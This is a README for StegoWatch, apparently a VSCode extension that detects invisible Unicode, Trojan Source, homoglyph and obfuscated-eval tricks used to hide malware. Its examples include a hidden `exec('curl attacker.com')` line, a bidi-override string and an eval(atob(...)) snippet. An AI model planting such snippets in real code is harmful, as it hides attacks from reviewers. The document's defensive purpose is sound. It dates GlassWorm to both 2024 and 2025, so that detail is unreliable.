# StegoWatch

**Protect yourself from hidden malicious code in VSCode extensions and source files.**

In 2025 Oct, the **Glassworm** VSCode extension infected developers by hiding malware in invisible Unicode characters. This extension helps detect such attacks in real-time, scanning both your code and installed extensions for suspicious patterns.

## Why You Need This

Attackers hide malicious code using techniques invisible in your editor:
- **Hidden characters** - Invisible Unicode that runs code you can't see
- **Trojan Source** - Text that looks safe but executes differently (CVE-2021-42574)
- **Supply chain attacks** - Malicious VSCode extensions with hidden payloads
- **Obfuscated eval** - Base64-encoded malware that decodes at runtime

StegoWatch catches these before they harm your system.

## Quick Usage

Press **`Cmd+Shift+P`** (Mac) or **`Ctrl+Shift+P`** (Windows/Linux) and type:

- `Security: Scan Current File` - Scan the file you're viewing
- `Security: Scan All Installed Extensions` - Check all VSCode extensions
- `Security: Show Anomaly Findings` - View detailed report
- `Security: Toggle Real-Time Scanning` - Enable/disable auto-scan

## What It Detects

### 1. **Unicode Steganography** 
Hidden data in invisible Unicode characters that look like normal spaces but carry secret payloads.

**Example:** Code that looks like `var x = 123;` but contains hidden characters with malicious instructions.

**Why dangerous:** Malware can hide in plain sight, passing code reviews unnoticed.

### 2. **Invisible Characters**
Zero-width spaces (U+200B), zero-width joiners, and byte-order marks that can alter code execution.

**Example:** `eval​("malicious code")` - The invisible space makes this hard to spot.

**Why dangerous:** Copy-pasted code from untrusted sources may contain hidden commands.

### 3. **Excessive Indentation**
Code hidden 200+ spaces to the right, invisible without horizontal scrolling.

**Example:** Normal code on the left, then far-right: `                                        exec('curl attacker.com')`

**Why dangerous:** Malware hides outside your editor's viewport during review.

### 4. **Bidirectional Override (Trojan Source)**
Unicode characters that reverse text direction, making code execute differently than it appears.

**Example:** `access_level = "user‮ // }⁦if (isAdmin)⁩ ⁦ "admin"` - Looks like setting "user" but actually sets "admin".

**Why dangerous:** CVE-2021-42574 - affects most programming languages.

### 5. **Homoglyph Attacks**
Characters that look identical but are different (e.g., Cyrillic 'а' vs Latin 'a').

**Example:** `function pаyment()` - The 'а' is Cyrillic, could call different function.

**Why dangerous:** Enables impersonation attacks, calling malicious functions instead of legitimate ones.

### 6. **Dynamic Code Execution**
Obfuscated eval patterns like `eval(atob("base64_malware"))` that decode and run hidden code.

**Example:** `eval(atob("Y29uc29sZS5sb2coJ2hhY2tlZCcp"))` - Decodes to malicious code at runtime.

**Why dangerous:** Bypasses static analysis, malware only appears when executed.

### ⚡ Real-Time Scanning
- Automatically scans as you type, save, or open files
- Alerts appear instantly in VSCode's Problems panel
- Scans new extensions immediately after installation
- Quick Fix actions to suppress false positives

## Quick Start

### Installation

```bash
code --install-extension stegowatch-1.0.0.vsix
```

### Commands

| Command | Description |
|---------|-------------|
| `Security: Scan Current File` | Scan active file |
| `Security: Scan All Installed Extensions` | Scan VSCode extensions |
| `Security: Show Anomaly Findings` | View detailed report |
| `Security: Clear Diagnostics and Rescan` | Force refresh |

### Example Detection

```
⚠️ Security Alert: "suspicious-ext" (2 critical)

• Dynamic code execution [🔴 Critical] - index.js:42
• Unicode steganography [🔴 Critical] - utils.js:89
• Invisible character [🟡 Medium] - main.js:156

[View Full Report] [Uninstall] [Dismiss]
```

## Configuration

Open VSCode settings: **`Cmd+,`** (Mac) or **`Ctrl+,`** (Windows/Linux), then search for **"stegowatch"**

### Customize Detection Patterns

You can enable/disable individual detections based on your needs:

```jsonc
{
  // Turn scanning on/off completely
  "malwareDetector.enabled": true,
  
  // === Detection Types (toggle any you don't need) ===
  
  "malwareDetector.detectUnicodeStego": true,
  // Finds invisible Unicode characters used to hide malicious code
  // ✅ Keep ON unless you intentionally use Unicode variation selectors
  
  "malwareDetector.detectInvisibleChars": true,
  // Detects zero-width spaces and hidden characters
  // ✅ Keep ON - these are almost never legitimate in code
  
  "malwareDetector.detectExcessiveIndentation": true,
  // Warns about code hidden far to the right (200+ spaces)
  // ✅ Keep ON unless you have extremely deep nesting
  
  "malwareDetector.detectBidiOverride": true,
  // Catches Trojan Source attacks (CVE-2021-42574)
  // ✅ Keep ON - bidirectional overrides shouldn't exist in code
  
  "malwareDetector.detectHomoglyphs": true,
  // Finds lookalike characters (e.g., Cyrillic 'а' vs Latin 'a')
  // ⚠️ May warn on legitimate non-English code - see language settings below
  
  "malwareDetector.detectSuspiciousEval": true,
  // Flags eval(atob(...)), new Function(atob(...)), etc.
  // ✅ Keep ON - legitimate uses are rare, use // security-ignore if needed
  
  // === Extension Scanning ===
  
  "malwareDetector.autoScanNewExtensions": true,
  // Automatically scans extensions when you install them
  // ✅ Recommended: Keep ON for supply chain security
  
  // === Sensitivity Settings ===
  
  "malwareDetector.minStegoSequence": 10,
  // How many invisible chars in a row trigger a warning
  // 🔧 Lower = more sensitive (may flag false positives)
  // 🔧 Higher = less sensitive (may miss threats)
  
  "malwareDetector.maxIndentation": 200,
  // How many spaces before code is considered "hidden"
  // 🔧 Adjust if you have legitimate deeply-nested code
  
  // === Language Support (Reduce False Positives) ===
  
  "malwareDetector.allowCJKinComments": true,
  // Allow Chinese/Japanese/Korean in comments without warnings
  // ✅ Keep ON if your team uses these languages
  
  "malwareDetector.excludeLanguages": [],
  // Don't scan certain file types at all
  // Example: ["markdown", "plaintext", "jsonc"]
  // 🔧 Add file types where these patterns are expected
  
  // === Alert Display ===
  
  "malwareDetector.severity": "Warning"
  // How findings appear in VSCode: "Error", "Warning", or "Information"
  // 🔧 "Error" = red squigglies, "Warning" = yellow, "Information" = blue
}
```

### Common Configuration Scenarios

**1. Working with internationalized code:**
```jsonc
{
  "malwareDetector.allowCJKinComments": true,
  "malwareDetector.detectHomoglyphs": false  // If you use non-Latin identifiers
}
```

**2. Less intrusive scanning:**
```jsonc
{
  "malwareDetector.severity": "Information",  // Blue hints instead of yellow warnings
  "malwareDetector.maxIndentation": 300      // Allow deeper nesting
}
```

**3. Maximum security (paranoid mode):**
```jsonc
{
  "malwareDetector.severity": "Error",       // Show as errors, not warnings
  "malwareDetector.minStegoSequence": 3,     // Flag even short suspicious sequences
  "malwareDetector.autoScanNewExtensions": true
}
```

## Handling False Positives

Sometimes legitimate code triggers warnings (e.g., internationalized apps, template engines). You have two ways to suppress them:

### Method 1: Comment Suppression

Add `// security-ignore` on the line before the warning:

```javascript
// security-ignore: Using eval for dynamic template rendering
eval(templateCode);  // ✅ This line will be ignored
```

### Method 2: Quick Fix

1. Click on the warning in your code (yellow squiggly line)
2. Click the 💡 lightbulb that appears
3. Select **"Ignore this finding (add security-ignore comment)"**
4. The comment is added automatically

## Real-World Protection

This extension's detection rules are based on analysis of actual malware campaigns:

- **ellacrity.recoil** (2024) - VSCode extension that used invisible Unicode (U+FE00-U+FE0F) to hide GitHub token-stealing code. Downloaded 1000+ times before discovery.

- **GlassWorm** (2024) - Supply chain attack targeting developers through malicious extensions, stealing credentials and tokens.

- **Trojan Source** (CVE-2021-42574) - Unicode bidirectional override vulnerability affecting most programming languages. Allows code to execute differently than it appears.

By detecting these patterns early, StegoWatch protects you from both known attacks and future variants using similar techniques.

## FAQ

**Q: Will this slow down my editor?**  
A: No. Scanning is incremental and runs in the background. Most files scan in milliseconds.

**Q: Does it send my code anywhere?**  
A: No. All scanning happens locally in your VSCode instance. Nothing leaves your machine.

**Q: I'm getting warnings on legitimate code. What should I do?**  
A: Use `// security-ignore` comments or adjust settings. For example, if you work with Chinese code, enable `allowCJKinComments`.

**Q: How is this different from a linter?**  
A: Linters check code quality. StegoWatch checks for security threats that are invisible or deliberately hidden, like steganography and Trojan Source attacks.

**Q: Can it detect all malware?**  
A: No tool catches everything. StegoWatch focuses on **obfuscation techniques** used to hide malicious code. It won't detect logic-based vulnerabilities or all types of malware, but it catches the sneaky hiding techniques that pass code review.

**Q: Should I scan all my extensions?**  
A: Yes! Use `Cmd+Shift+P` → `Security: Scan All Installed Extensions`. Supply chain attacks via malicious extensions are increasingly common.

## Development

### Build

```bash
npm install -g vsce
vsce package
```

### Test Files

Located in `tests/` folder:

- `test-examples.js` - All detection types
- `test-chinese-false-positives.js` - Legitimate Chinese code
- `test-multilingual.js` - 10 languages for false positive testing

## License

MIT License

## Credits

Created to address the ellacrity.recoil malware incident and protect developers from supply chain attacks targeting VSCode extensions.
